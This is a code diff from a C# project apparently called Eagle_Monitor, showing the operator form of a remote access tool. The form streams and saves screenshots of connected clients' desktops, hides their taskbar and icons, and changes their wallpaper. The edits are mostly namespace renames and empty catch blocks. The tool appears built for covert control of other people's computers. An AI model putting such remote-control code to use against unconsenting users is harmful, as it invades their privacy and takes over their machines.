@@ -34,23 +34,30 @@ namespace Eagle_Monitor.Forms
             this.loadingCircle1.Active = true;
             Client C = Client.ClientDictionary[this.IP_Origin];
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.RemoteDesktop;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.Misc = new object[] { Shared.PacketTypes.PacketType.REMOTE_VIEW, desktopPictureBox.Width, desktopPictureBox.Height, quailitySiticoneTrackBar.Value, formatComboBox.Text };
+            D.Misc = new object[] { Shared.PacketType.REMOTE_VIEW, desktopPictureBox.Width, desktopPictureBox.Height, quailitySiticoneTrackBar.Value, formatComboBox.Text };
             Task.Run(() => C.SendData(D.Serialize()));*/
         }
+
         private void RemoteDesktopForm_Deactivate_1(object sender, EventArgs e)
         {
            // HasToCapture = false;
         }
+
         private void closeButton_Click(object sender, EventArgs e)
         {
-            pictureBox1.Image = Eagle_Monitor.Properties.Resources.icons8_not_sending_video_frames_32;
-            HasToCapture = false;
-            this.Close();
+            try
+            {
+                pictureBox1.Image = Eagle_Monitor.Properties.Resources.icons8_not_sending_video_frames_32;
+                HasToCapture = false;
+                this.Close();
+            }
+            catch { }
         }
+
         private void maximizeButton_Click(object sender, EventArgs e)
         {
             if (this.WindowState == FormWindowState.Normal)
@@ -62,6 +69,7 @@ namespace Eagle_Monitor.Forms
                 this.WindowState = FormWindowState.Normal;
             }
         }
+
         private void minimizeButton_Click(object sender, EventArgs e)
         {
             this.WindowState = FormWindowState.Minimized;
@@ -69,16 +77,17 @@ namespace Eagle_Monitor.Forms
 
         private void saveWindowsButton_Click(object sender, EventArgs e)
         {
-            if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + this.ClientHWID + "\\" + "Screenshots") == false)
-                System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + this.ClientHWID + "\\" + "Screenshots");
-
-            string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
             try
             {
-                System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + this.ClientHWID + "\\Screenshots\\" + Date + "." + Client.ClientDictionary[this.IP_Origin].remoteDesktopForm.formatComboBox.Text.ToLower(), Utilities.ImageToBytes(Client.ClientDictionary[this.IP_Origin].remoteDesktopForm.desktopPictureBox.Image) );
-            }
-            catch(Exception ex) { MessageBox.Show(ex.ToString()); }
+                Client C = Client.ClientDictionary[this.IP_Origin];
+                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\" + "Screenshots") == false)
+                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\" + "Screenshots");
 
+                string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
+
+                System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\Screenshots\\" + Date + "." + Client.ClientDictionary[this.IP_Origin].remoteDesktopForm.formatComboBox.Text.ToLower(), Utilities.ImageToBytes(Client.ClientDictionary[this.IP_Origin].remoteDesktopForm.desktopPictureBox.Image));
+            }
+            catch{ }
         }
 
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
@@ -91,11 +100,11 @@ namespace Eagle_Monitor.Forms
                 this.loadingCircle1.Active = true;
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.RemoteDesktop;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.REMOTE_VIEW, desktopPictureBox.Width, desktopPictureBox.Height, quailitySiticoneTrackBar.Value, formatComboBox.Text };
+                D.DataReturn = new object[] { Shared.PacketType.REMOTE_VIEW, desktopPictureBox.Width, desktopPictureBox.Height, quailitySiticoneTrackBar.Value, formatComboBox.Text };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
             else 
@@ -103,8 +112,7 @@ namespace Eagle_Monitor.Forms
                 pictureBox1.Image = Eagle_Monitor.Properties.Resources.icons8_not_sending_video_frames_32;
                 HasToCapture = false;
             }
-        }
-      
+        }  
         private void RemoteDesktopForm_Load(object sender, EventArgs e)
         {
             ControlsDrawing.Enable(desktopPictureBox);
@@ -121,11 +129,11 @@ namespace Eagle_Monitor.Forms
         {
             Client C = Client.ClientDictionary[this.IP_Origin];
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.Miscellaneous;
             D.IP_Origin = C.IP;
             D.DataReturn = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.HIDE_TB};
+            D.DataReturn = new object[] { Shared.PacketType.HIDE_TB};
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -133,11 +141,11 @@ namespace Eagle_Monitor.Forms
         {
             Client C = Client.ClientDictionary[this.IP_Origin];
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.Miscellaneous;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SHOW_TB };
+            D.DataReturn = new object[] { Shared.PacketType.SHOW_TB };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -145,11 +153,11 @@ namespace Eagle_Monitor.Forms
         {
             Client C = Client.ClientDictionary[this.IP_Origin];
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.Miscellaneous;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.HIDE_DI };
+            D.DataReturn = new object[] { Shared.PacketType.HIDE_DI };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -157,11 +165,11 @@ namespace Eagle_Monitor.Forms
         {
             Client C = Client.ClientDictionary[this.IP_Origin];
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.Miscellaneous;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SHOW_DI };
+            D.DataReturn = new object[] { Shared.PacketType.SHOW_DI };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -176,11 +184,11 @@ namespace Eagle_Monitor.Forms
                     byte[] file = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);
                     Client C = Client.ClientDictionary[this.IP_Origin];
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.Miscellaneous;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SET_DESK_WP, file , Path.GetExtension(o.FileName)};
+                    D.DataReturn = new object[] { Shared.PacketType.SET_DESK_WP, file , Path.GetExtension(o.FileName)};
                     Task.Run(() => C.SendData(D.Serialize()));
                 }
             }
